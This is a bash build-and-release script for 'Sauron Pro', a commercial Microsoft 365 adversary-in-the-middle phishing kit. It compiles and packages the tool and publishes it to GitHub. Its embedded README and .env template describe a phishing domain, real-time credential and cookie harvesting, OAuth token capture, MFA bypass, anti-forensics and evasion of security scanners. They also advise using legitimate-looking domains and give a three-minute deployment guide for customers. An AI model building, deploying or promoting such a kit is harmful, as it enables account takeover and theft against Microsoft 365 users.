#!/bin/bash
set -e

# Auto-detect version from git tags or use default
if [ -z "$1" ]; then
    # Try to get latest git tag, fallback to date-based version
    if git describe --tags --exact-match HEAD 2>/dev/null; then
        VERSION=$(git describe --tags --exact-match HEAD)
    else
        VERSION="v$(date +%Y.%m.%d)-$(git rev-parse --short HEAD)"
    fi
    echo "🏷️  Auto-detected version: $VERSION"
else
    VERSION="$1"
    echo "🏷️  Using provided version: $VERSION"
fi

RELEASE_DIR="release-$VERSION"
BUILD_DIR="$RELEASE_DIR/sauron"

echo "🚀 Building Sauron Release Package $VERSION"
echo "📦 Creating release directory: $RELEASE_DIR"

# Clean previous builds
rm -rf "$RELEASE_DIR"
mkdir -p "$BUILD_DIR"

# ───────────── Build Binary ─────────────
echo "🔨 Building optimized Go binary..."

# Check if we're cross-compiling or building natively
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    # Native Linux build with CGO
    echo "🐧 Building on Linux (native)"
    CGO_ENABLED=1 go build \
        -ldflags="-w -s -X main.version=$VERSION" \
        -o "$BUILD_DIR/sauron" \
        main.go
else
    # Cross-compile from macOS/Windows - disable CGO for SQLite
    echo "🍎 Cross-compiling for Linux (CGO disabled)"
    CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
        -ldflags="-w -s -X main.version=$VERSION" \
        -tags="sqlite_omit_load_extension" \
        -o "$BUILD_DIR/sauron" \
        main.go
fi

# Make binary executable
chmod +x "$BUILD_DIR/sauron"

echo "✅ Binary built: $(du -h "$BUILD_DIR/sauron" | cut -f1)"

# ───────────── Copy Essential Files ─────────────
echo "📁 Copying essential files..."

# Installation files
cp -r install/ "$BUILD_DIR/"

# Configuration script
cp scripts/configure-env.sh "$BUILD_DIR/"
chmod +x "$BUILD_DIR/configure-env.sh"

# Configuration files (if they exist)
if [ -d "config/" ]; then
    cp -r config/ "$BUILD_DIR/"
fi

# Static assets and data
mkdir -p "$BUILD_DIR/geo"
if [ -f "geo/GeoLite2-Country.mmdb" ]; then
    cp geo/GeoLite2-Country.mmdb "$BUILD_DIR/geo/"
fi

mkdir -p "$BUILD_DIR/data"
if [ -f "data/slug_stats.json" ]; then
    cp data/slug_stats.json "$BUILD_DIR/data/"
fi

# TLS directory structure
mkdir -p "$BUILD_DIR/tls/certs"

# Logs directory
mkdir -p "$BUILD_DIR/logs"

# ───────────── Create Example Environment File ─────────────
cat > "$BUILD_DIR/.env.example" << 'ENV_EOF'
# Sauron Production Configuration
# Copy this to .env and fill in your values

# Your phishing domain (must be registered and point to this server)
SAURON_DOMAIN=microsoftlogin365.com

# Cloudflare API token for automatic SSL certificates
CLOUDFLARE_API_TOKEN=your_cloudflare_api_token_here

# Turnstile configuration (get from Cloudflare dashboard)
TURNSTILE_SECRET=your_turnstile_secret_here

# Optional: License token secret (for premium features)
LICENSE_TOKEN_SECRET=your_license_secret_here

# Optional: Use staging certificates for testing
# STAGING=true

# Optional: Development mode (disables some security features)
# DEV_MODE=false
ENV_EOF

# ───────────── Create Documentation ─────────────
cat > "$BUILD_DIR/README.md" << 'README_EOF'
# 🚀 Sauron Pro - Production Deployment

**Microsoft 365 MITM Proxy System** - Professional deployment package for enterprise operations.

---

## ⚡ Ultra-Fast Setup (3 minutes)

### Step 1: Prerequisites ✅
- **Ubuntu 20.04+** VPS with root access
- **Domain registered** and pointed to your server IP
- **Cloudflare account** (free tier works)

### Step 2: Upload & Extract 📦
```bash
# Upload the .tar.gz file to your VPS, then:
tar -xzf sauron-*.tar.gz
cd sauron
```

### Step 3: One-Command Setup 🔧
```bash
# This script handles EVERYTHING automatically:
sudo ./install-production.sh
```

**That's it!** The installer will:
- ✅ Install Docker (if needed)
- ✅ Install system dependencies 
- ✅ Guide you through Cloudflare setup
- ✅ Configure SSL certificates automatically
- ✅ Start all services
- ✅ Verify everything works

---

## 🔧 What the Installer Does

The `install-production.sh` script is **fully automated** and handles:

1. **System Setup**: Installs Docker, Redis, SSL tools
2. **Interactive Configuration**: Walks you through Cloudflare setup
3. **Domain Validation**: Checks your DNS configuration
4. **SSL Automation**: Sets up Let's Encrypt certificates
5. **Service Deployment**: Starts Sauron with proper configuration
6. **Health Checks**: Verifies everything is running correctly

---

## 🌐 Configuration Made Simple

The installer includes an **interactive setup wizard** that asks you:

1. **Your phishing domain** (e.g., `microsoftlogin365.com`)
2. **Cloudflare API token** (we'll show you how to get it)
3. **Turnstile settings** (optional, for bot protection)

**No manual .env editing needed!** The wizard creates everything for you.

---

## 📊 Management Dashboard

Once installed, access your admin panel at:
```
https://yourdomain.com/admin
```

### Quick Status Commands
```bash
# Check if everything is running
sudo systemctl status sauron

# View real-time logs
sudo journalctl -u sauron -f

# Restart if needed
sudo systemctl restart sauron
```

---

## 🎯 System Capabilities

### **Real-Time Microsoft 365 Interception**
- OAuth2 flow capture with token extraction
- Multi-factor authentication bypass
- Session synchronization across devices
- Real-time credential harvesting

### **Advanced Bot Detection**
- Headless browser detection
- Automation framework identification  
- IP reputation filtering
- Behavioral analysis

### **Enterprise Management**
- **Slug-based operations** for campaign isolation
- **WebSocket interface** for real-time control
- **Statistics tracking** and analytics
- **Admin controls** with risk management

### **Security Features**
- **TLS interception** with real certificate validation
- **Cookie harvesting** from Microsoft authentication
- **Session state management** across multiple flows
- **Anti-forensics** and memory protection

---

## 🔗 API Reference

| Endpoint | Purpose | Method |
|----------|---------|---------|
| `/login` | Credential verification | GET |
| `/common/oauth2/v2.0/token` | OAuth2 token capture | POST |
| `/common/SAS/ProcessAuth` | 2FA/MFA bypass | POST |
| `/stats` | Slug analytics | GET |
| `/ws` | Real-time management | WebSocket |
| `/admin/*` | Enterprise controls | POST |

---

## 🛡️ Security Best Practices

- **Domain Selection**: Use legitimate-looking domains (avoid obvious phishing patterns)
- **Log Monitoring**: Check logs regularly for detection attempts
- **Update Schedule**: Keep system and certificates updated
- **Access Control**: Restrict admin panel access to trusted IPs

---

## 🆘 Troubleshooting

### Common Issues & Solutions

**🔴 "Domain not pointing to server"**
```bash
# Check DNS propagation
dig yourdomain.com
# Should show your server IP
```

**🔴 "Cloudflare API token invalid"**
- Ensure token has `Zone:Edit` permissions
- Check token isn't expired in Cloudflare dashboard

**🔴 "SSL certificate failed"**
```bash
# Check acme.sh status
sudo acme.sh --list
# Retry certificate generation
sudo acme.sh --issue -d yourdomain.com --dns dns_cf
```

**🔴 "Service won't start"**
```bash
# Check detailed logs
sudo journalctl -u sauron --no-pager -l
```

---

## 🔄 Updates

Update to newer versions:
```bash
# Stop current version
sudo systemctl stop sauron

# Extract new version
tar -xzf sauron-new-version.tar.gz
cd sauron

# Run update script
sudo ./update-sauron.sh
```

---

## 📞 Support

For technical support or questions:
- Check the troubleshooting section above
- Review system logs for specific error messages
- Verify all prerequisites are met

**🎯 Professional deployment in under 3 minutes!**
README_EOF

# ───────────── Create Verification Script ─────────────
cat > "$BUILD_DIR/verify-installation.sh" << 'VERIFY_EOF'
#!/bin/bash

echo "🔍 Verifying Sauron Installation..."

# Check if binary exists and is executable
if [ -x "/usr/local/bin/sauron" ]; then
    echo "✅ Sauron binary installed"
    echo "📊 Binary size: $(du -h /usr/local/bin/sauron | cut -f1)"
else
    echo "❌ Sauron binary not found or not executable"
fi

# Check systemd service
if systemctl is-enabled sauron.service >/dev/null 2>&1; then
    echo "✅ Sauron service enabled"
    
    if systemctl is-active sauron.service >/dev/null 2>&1; then
        echo "✅ Sauron service running"
    else
        echo "⚠️ Sauron service not running"
        echo "🔧 Try: sudo systemctl start sauron"
    fi
else
    echo "❌ Sauron service not enabled"
fi

# Check Redis
if systemctl is-active redis-server >/dev/null 2>&1; then
    echo "✅ Redis server running"
else
    echo "❌ Redis server not running"
fi

# Check acme.sh
if [ -x "/usr/local/bin/acme.sh" ]; then
    echo "✅ acme.sh installed"
else
    echo "❌ acme.sh not found"
fi

# Check .env file
if [ -f ".env" ]; then
    echo "✅ Environment file exists"
    
    # Check required variables
    source .env
    if [ -n "$SAURON_DOMAIN" ]; then
        echo "✅ SAURON_DOMAIN configured: $SAURON_DOMAIN"
    else
        echo "❌ SAURON_DOMAIN not set"
    fi
    
    if [ -n "$CLOUDFLARE_API_TOKEN" ]; then
        echo "✅ CLOUDFLARE_API_TOKEN configured"
    else
        echo "❌ CLOUDFLARE_API_TOKEN not set"
    fi
else
    echo "❌ .env file not found"
fi

echo "🔍 Verification complete"
VERIFY_EOF

chmod +x "$BUILD_DIR/verify-installation.sh"

# ───────────── Create Update Script ─────────────
echo "📝 Creating update script from template..."
cp scripts/update-sauron-template.sh "$BUILD_DIR/update-sauron.sh"
chmod +x "$BUILD_DIR/update-sauron.sh"

# ───────────── Create Archive ─────────────
echo "📦 Creating release archive..."
cd "$RELEASE_DIR"

# Create both versioned and latest archives
tar -czf "sauron-$VERSION-linux-amd64.tar.gz" sauron/
tar -czf "sauron-linux-amd64.tar.gz" sauron/

cd ..

# Show release info
echo ""
echo "🎉 Release package created successfully!"
echo "📁 Location: $RELEASE_DIR/"
echo "📦 Versioned: $RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz"
echo "📦 Latest: $RELEASE_DIR/sauron-linux-amd64.tar.gz"
echo "💾 Archive size: $(du -h "$RELEASE_DIR/sauron-linux-amd64.tar.gz" | cut -f1)"
echo ""
echo "🚀 CUSTOMER DEPLOYMENT (Ultra-Simple):"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "1️⃣  Upload: sauron-linux-amd64.tar.gz to VPS"
echo "2️⃣  Extract: tar -xzf sauron-linux-amd64.tar.gz"
echo "3️⃣  Enter: cd sauron"
echo "4️⃣  Install: sudo ./install-production.sh"
echo ""
echo "✨ That's it! The installer handles everything automatically."
echo "🎯 3-minute professional deployment guaranteed."
echo ""

# ───────────── Interactive GitHub Release ─────────────
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📤 GITHUB RELEASE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
read -p "🤔 Do you want to push this release to GitHub now? [y/N]: " -n 1 -r
echo ""

if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo ""
    echo "🚀 Pushing release to GitHub..."
    
    # Create git tag if it doesn't exist
    if ! git tag -l | grep -q "^$VERSION$"; then
        echo "🏷️  Creating git tag: $VERSION"
        git tag "$VERSION" -m "Sauron release $VERSION"
    fi
    
    # Push tag to GitHub
    echo "📤 Pushing tag to GitHub..."
    git push sauron-pro "$VERSION"
    
    # Check if GitHub CLI is available
    if command -v gh >/dev/null 2>&1; then
        echo "📦 Creating GitHub release with files..."
        
        # Create release with both files
        gh release create "$VERSION" \
            --repo "Skillz147/Sauron-Pro" \
            --title "Sauron Release $VERSION" \
            --notes "Automated release build $VERSION

## 🚀 Installation
\`\`\`bash
wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz
tar -xzf sauron-linux-amd64.tar.gz
cd sauron
sudo ./install-production.sh
\`\`\`

## 📦 Package Contents
- Compiled binary (no source code)
- Automated installer with Docker support
- Interactive Cloudflare setup wizard
- Professional deployment documentation

**3-minute deployment guaranteed!**" \
            "$RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz" \
            "$RELEASE_DIR/sauron-linux-amd64.tar.gz"
        
        echo ""
        echo "✅ GitHub release created successfully!"
        echo "🌐 View at: https://github.com/Skillz147/Sauron-Pro/releases/tag/$VERSION"
        
    else
        echo ""
        echo "⚠️  GitHub CLI (gh) not found."
        echo "📋 Manual steps:"
        echo "   1. Go to: https://github.com/Skillz147/Sauron-Pro/releases/new"
        echo "   2. Select tag: $VERSION"
        echo "   3. Upload both files:"
        echo "      - $RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz"
        echo "      - $RELEASE_DIR/sauron-linux-amd64.tar.gz"
    fi
    
else
    echo ""
    echo "⏭️  Skipping GitHub push."
    echo "📋 To push later:"
    echo "   git tag $VERSION -m 'Sauron release $VERSION'"
    echo "   git push sauron-pro $VERSION"
    echo "   # Then create release at: https://github.com/Skillz147/Sauron-Pro/releases/new"
fi

echo ""
